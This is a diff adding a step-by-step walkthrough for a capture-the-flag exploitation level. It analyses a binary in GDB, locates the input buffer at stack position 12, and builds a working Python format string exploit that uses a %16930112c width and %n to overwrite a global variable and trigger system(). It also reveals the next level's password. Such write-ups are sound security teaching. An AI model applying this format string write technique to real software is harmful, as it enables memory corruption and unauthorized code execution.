@@ -1,0 +1,132 @@
+# Level4 Walkthrough - Step by Step
+
+## Quick Summary
+Level4 exploits a format string vulnerability to write the value 16930116 to a global variable, triggering execution of system() to reveal the level5 password.
+
+## Step-by-Step Process
+
+### 1. Initial Analysis
+```bash
+# Check file properties
+file level4
+ls -la level4
+
+# Run the program to understand behavior
+echo "test" | ./level4
+# Output: test (simple echo behavior)
+
+echo "AAAA%x%x%x" | ./level4
+# Shows format string vulnerability exists
+```
+
+### 2. Binary Analysis with GDB
+```bash
+gdb level4
+(gdb) info functions
+# Found: main, n, p functions
+
+(gdb) disas main
+# Shows main() calls n()
+
+(gdb) disas n  
+# Shows n() does fgets() then calls p()
+# Shows comparison: cmp $0x1025544,%eax (16930116 decimal)
+# Shows global variable at 0x8049810
+
+(gdb) disas p
+# Shows vulnerable printf(buffer) call
+```
+
+### 3. Stack Position Discovery
+```bash
+# Test input to find our buffer position on stack
+echo "AAAA%1\$x.%2\$x.%3\$x.%4\$x.%5\$x.%6\$x.%7\$x.%8\$x.%9\$x.%10\$x.%11\$x.%12\$x" | ./level4
+
+# Look for 0x41414141 (AAAA in hex)
+# Found at position 12: %12$x shows 41414141
+```
+
+### 4. Basic Format String Test
+```python
+# Test basic write capability
+import struct
+payload = struct.pack("<L", 0x8049810) + "%12$n"
+print payload
+
+# This writes value 4 to the global variable (length of address)
+```
+
+### 5. Understanding the Challenge
+- Need to write value: 16930116 (0x1025544)  
+- Address target: 0x8049810 (global variable m)
+- Challenge: How to efficiently generate 16,930,116 characters for %n
+
+### 6. Width Specifier Solution Discovery
+```python
+# Instead of printing millions of characters individually:
+# Use width specifier: %[number]c prints 1 char padded to [number] width
+
+target_value = 16930116
+already_printed = 4  # from the 4-byte address
+remaining = target_value - already_printed  # 16930112
+
+# Format: address + %16930112c + %12$n
+```
+
+### 7. Final Exploit Development
+```python
+#!/usr/bin/env python2
+import struct
+
+target_addr = 0x8049810
+target_value = 16930116
+
+payload = struct.pack("<L", target_addr)  # 4 bytes
+remaining = target_value - 4              # 16930112
+payload += "%" + str(remaining) + "c"     # Width specifier  
+payload += "%12$n"                        # Write to position 12
+
+print payload
+```
+
+### 8. Execution and Success
+```bash
+python exploit.py | ./level4
+# Output: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+# Verify it's the complete password
+python exploit.py | ./level4 | wc -c
+# Output: 65 (correct length)
+```
+
+## Key Techniques Used
+
+1. **GDB Analysis**: Reverse engineering to understand program flow
+2. **Stack Position Discovery**: Systematic testing to find input location
+3. **Format String Exploitation**: Using %n to write arbitrary values
+4. **Width Specifier Optimization**: Efficient generation of large character counts
+5. **Little Endian Packing**: Proper address formatting for x86 architecture
+
+## Critical Insights
+
+- **Width Specifiers**: %[width]c is much more efficient than printing millions of characters
+- **Stack Positions**: Input buffer appears at stack position 12 in this binary
+- **Memory Targets**: Global variables in .data section are writable targets
+- **Large Values**: Creative techniques needed when target values are very large
+
+## Files Created
+- `exploit.py` - Final working exploit
+- `debug_exploit.py` - Development version with debugging output  
+- `Ressources/analysis.md` - Comprehensive technical analysis
+
+## Password for Level5
+```
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+## Next Steps
+Use the obtained password to access level5:
+```bash
+su level5
+# Enter password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
